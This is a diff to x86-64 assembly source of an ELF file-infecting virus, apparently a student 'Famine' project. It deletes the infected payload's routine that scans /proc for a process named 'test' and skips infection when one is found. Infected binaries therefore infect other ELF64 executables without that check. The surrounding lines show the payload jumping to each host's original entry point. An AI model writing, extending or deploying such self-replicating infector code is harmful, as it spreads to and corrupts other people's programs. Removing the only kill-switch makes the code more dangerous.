@@ -240,10 +240,7 @@ _start.run_as_virus:
     ; We're running as the virus payload in an infected binary
     ; We need to use stack-based buffers and position-independent code
     
-    ; Check if "test" process is running (before infecting anything)
-    call virus_check_process_running
-    test rax, rax
-    jnz .virus_skip_to_original ; If "test" process is running, skip infection and go to original entry
+    ; Skip process check in infected binaries - only Famine binary checks for test process
     
     ; The stored value is the offset from our _start to the original entry
     ; Calculate actual original entry: current_rip + stored_offset
@@ -458,159 +455,11 @@ virus_search_signature:
 ; Checks if a process named "test" is running
 ; r15 = virus base address (preserved)
 ; Returns: rax = 1 if "test" process is running, 0 otherwise
-; Position-independent version for virus payload
 ; ============================================
-virus_check_process_running:
-    push rbp
-    mov rbp, rsp
-    push r12                    ; proc fd
-    push r13                    ; status fd
-    push r14                    ; saved r15
-    push rbx
-    sub rsp, 512                ; Stack space for buffers (AFTER pushes)
-
-    mov r14, r15                ; Save r15 (virus base)
-    xor rbx, rbx                ; process found flag = 0
-
-    ; Open /proc directory
-    mov eax, SYS_OPENAT
-    mov edi, AT_FDCWD
-    lea rsi, [r15 + v_procdir - virus_start]
-    mov edx, O_RDONLY | O_DIRECTORY
-    xor r10d, r10d
-    syscall
-
-    test rax, rax
-    js .vcheck_proc_done        ; Failed to open /proc
-
-    mov r12, rax                ; Save /proc fd
-
-.vcheck_proc_read_loop:
-    ; Read directory entries
-    mov eax, SYS_GETDENTS64
-    mov edi, r12d
-    lea rsi, [rsp]              ; Buffer at rsp (after stack allocation)
-    mov edx, 512
-    syscall
-
-    test rax, rax
-    jle .vcheck_proc_close      ; EOF or error
-
-    mov [rbp-8], rax            ; Save bytes read
-    mov qword [rbp-16], 0       ; pos = 0
-
-.vcheck_proc_process_entry:
-    mov rax, [rbp-16]
-    cmp rax, [rbp-8]
-    jge .vcheck_proc_read_loop
-
-    lea rdi, [rsp]
-    add rdi, rax                ; dirent pointer
-
-    ; Get d_reclen
-    movzx ecx, word [rdi + 16]
-    mov [rbp-24], rcx
-
-    ; Get d_name
-    lea rsi, [rdi + 19]
-
-    ; Check if d_name is numeric (process directory)
-    movzx eax, byte [rsi]
-    cmp al, '0'
-    jb .vcheck_proc_next_entry
-    cmp al, '9'
-    ja .vcheck_proc_next_entry
-
-    ; Build path: /proc/[pid]/status
-    lea rdi, [rsp+256]          ; path buffer
-    lea rsi, [r14 + v_procdir - virus_start]
-    call virus_str_copy         ; Copy "/proc/"
-    
-    lea rdi, [rsp+256]
-    call virus_str_len
-    lea rdi, [rsp+256]
-    add rdi, rax
-    lea rsi, [rsp]
-    mov rax, [rbp-16]
-    add rsi, rax
-    add rsi, 19                 ; d_name
-    call virus_str_copy         ; Copy pid
-    
-    ; Append "/status"
-    lea rdi, [rsp+256]
-    call virus_str_len
-    lea rdi, [rsp+256]
-    add rdi, rax
-    lea rsi, [r14 + v_proc_status - virus_start]
-    call virus_str_copy
-
-    ; Open status file
-    mov eax, SYS_OPENAT
-    mov edi, AT_FDCWD
-    lea rsi, [rsp+256]
-    xor edx, edx                ; O_RDONLY
-    xor r10d, r10d
-    syscall
-
-    test rax, rax
-    js .vcheck_proc_next_entry  ; Failed to open status file
-
-    mov r13, rax                ; Save status fd
-
-    ; Read status file (first 128 bytes should be enough)
-    mov eax, SYS_READ
-    mov edi, r13d
-    lea rsi, [rsp+128]          ; status buffer
-    mov edx, 128
-    syscall
-
-    mov [rbp-32], rax           ; Save bytes read
-
-    ; Close status file
-    mov eax, SYS_CLOSE
-    mov edi, r13d
-    syscall
-
-    cmp qword [rbp-32], 0
-    jle .vcheck_proc_next_entry
-
-    ; Search for "Name:\ttest\n" in status buffer
-    lea rdi, [rsp+128]
-    mov rsi, [rbp-32]           ; bytes read
-    lea rdx, [r14 + v_proc_test_string - virus_start]
-    mov rcx, v_proc_test_len
-    call virus_search_signature
-
-    test rax, rax
-    jz .vcheck_proc_next_entry
-
-    ; Found "test" process!
-    mov rbx, 1
-    jmp .vcheck_proc_close
-
-.vcheck_proc_next_entry:
-    mov rax, [rbp-16]
-    add rax, [rbp-24]
-    mov [rbp-16], rax
-    jmp .vcheck_proc_process_entry
-
-.vcheck_proc_close:
-    mov eax, SYS_CLOSE
-    mov edi, r12d
-    syscall
-
-.vcheck_proc_done:
-    mov rax, rbx                ; Return process found flag
-    mov r15, r14                ; Restore r15
-
-    add rsp, 512
-    pop rbx
-    pop r14
-    pop r13
-    pop r12
-    mov rsp, rbp
-    pop rbp
-    ret
+; virus_check_process_running - REMOVED
+; Process check is now only done in the Famine binary, not in infected binaries
+; This simplifies the code and avoids stack layout issues
+; ============================================
 
 ; ============================================
 ; virus_list_and_infect - List files and infect ELF64 executables
